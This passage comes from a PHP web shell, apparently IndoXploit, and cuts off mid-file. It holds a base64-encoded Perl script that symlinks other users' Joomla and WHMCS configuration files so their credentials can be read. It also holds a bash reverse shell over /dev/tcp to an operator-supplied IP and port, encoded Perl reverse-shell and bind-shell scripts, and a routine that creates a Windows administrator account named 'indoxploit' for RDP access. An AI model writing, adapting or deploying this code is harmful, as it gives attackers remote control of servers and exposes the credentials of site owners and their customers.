bi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jczEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9IT1NUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvc3Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JURVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW5zL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1RJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0FSVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvT1JERVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UQVJFQS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQlVZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTUFOQUdFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudFN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NIRUNLT1VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jaGVja291dC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JBU0tFVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NFQ1VSRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NBTEVTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zYWxlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTEwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1BVUkNIQVNFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wdXJjaGFzZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FDQ09VTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWNjb3VudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VTRVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdXNlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50cy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01ZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9teS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wYW5lbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnQvb3JkZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9DQopOw0KZm9yZWFjaCAoQGFycmF5KXsNCglteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9Ow0KCW15ICR0eXBlY29uZmlnID0gJF8tPnt0eXBlfTsNCglzeW1saW5rKCIkY29uZmlnbnlhIiwiaWR4X3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsNCglta2RpciAiaWR4X3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiOw0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJpZHhfc3ltLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dC8weDE5OTkudHh0Iik7DQoJY29weSgiaWR4X3N5bS9uZW11LnR4dCIsImlkeF9zeW0vJHVzZXJueWEtJHR5cGVjb25maWcudHh0Ly5odGFjY2VzcyIpIDsNCgl9DQp9DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50ICI8aGVhZD48dGl0bGU+QnlwYXNzIDQwNCBCeSAweDE5OTk8L3RpdGxlPjwvaGVhZD4iOw0KcHJpbnQgJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjU7IHVybD1pZHhfc3ltIi8+JzsNCnByaW50ICc8Ym9keT48Y2VudGVyPjxoMT4weDE5OTkgTmV2ZXIgRGllPC9oMT4nOw0KcHJpbnQgJzxhIGhyZWY9ImlkeF9zeW0iPktsaWsgRGlzaW5pPC9hPic7DQp1bmxpbmsoJDApOw==";
			save("/tmp/symlink.pl", "w", base64_decode($sym['code']));
			exe("perl /tmp/symlink.pl");
			sleep(1);
			@unlink("/tmp/symlink.pl");
			@unlink("passwd.txt");
			@unlink("idx_sym/pas.txt");
			@unlink("idx_sym/nemu.txt");
		}

		print "<div style='background: #ffffff; width: 100%; height: 100%'>";
		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_sym/' frameborder='0' scrolling='yes'></iframe>";
		print "</div>";
	}
	elseif($toolsname === "network") {
		$args = explode(" ", $args);

		if($args[0] === "bc") {
			if(empty($args[1])) die(color(1, 1, "Set Your IP for BackConnect!"));
			if(empty($args[2])) die(color(1, 1, "Set Your PORT for BackConnect!"));
			if(empty($args[3])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));

			if($args[3] === "bash") {
				exe("/bin/bash -i >& /dev/tcp/".$args[1]."/".$args[2]." 0>&1");
			}
			elseif($args[3] === "perl") {
				$bc['code'] = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
				save("/tmp/bc.pl", "w", base64_decode($bc['code']));
				$bc['exec'] = exe("perl /tmp/bc.pl ".$args[1]." ".$args[2]." 1>/dev/null 2>&1 &");
				sleep(1);
				print "<pre>".$bc['exec']."\n".exe("ps aux | grep bc.pl")."</pre>";
				@unlink("/tmp/bc.pl");
			}
		}
		elseif($args[0] === "bp") {
			if(empty($args[1])) die(color(1, 1, "Set Your PORT for Bind Port!"));
			if(empty($args[2])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));

			if($args[2] === "perl") {
				$bp['code'] = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
				save("/tmp/bp.pl", "w", base64_decode($bp['code']));
				$bp['exec'] = exe("perl /tmp/bp.pl ".$args[1]." 1>/dev/null 2>&1 &");
				sleep(1);
				print "<pre>".$bp['exec']."\n".exe("ps aux | grep bp.pl")."</pre>";
				@unlink("/tmp/bp.pl");
			}
		}
		else {
			print color(1, 1, "Unknown '".$args[0]."'");
		}
	}
	elseif($toolsname === "krdp") {
		$args = explode(" ", $args);

		if(OS() !== "Windows") die(color(1, 1, "Just For Windows Server"));
		if(preg_match("/indoxploit/", exe("net user"))) die(color(1, 1, "[INFO] username 'indoxploit' already exists."));

		$add_user   = exe("net user indoxploit indoxploit /add");
    	$add_groups1 = exe("net localgroup Administrators indoxploit /add");
    	$add_groups2 = exe("net localgroup Administrator indoxploit /add");
    	$add_groups3 = exe("net localgroup Administrateur indoxploit /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "indoxploit")."<br>
    	Password: ".color(1, 2, "indoxploit")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";

    	if($add_user) {
    		print "[add user] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	else {
    		print "[add user] -> ".color(1, 1, "FAILED")."<br>";
    	}
    	
    	if($add_groups1) {
        	print "[add localgroup Administrators] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	elseif($add_groups2) {
            print "[add localgroup Administrator] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	elseif($add_groups3) { 
            print "[add localgroup Administrateur] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	else {
    		print "[add localgroup] -> ".color(1, 1, "FAILED")."<br>";
    	}

    	print "------------------------------<br>";
	}
}

function perms($file){
	$perms = fileperms($file);

	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
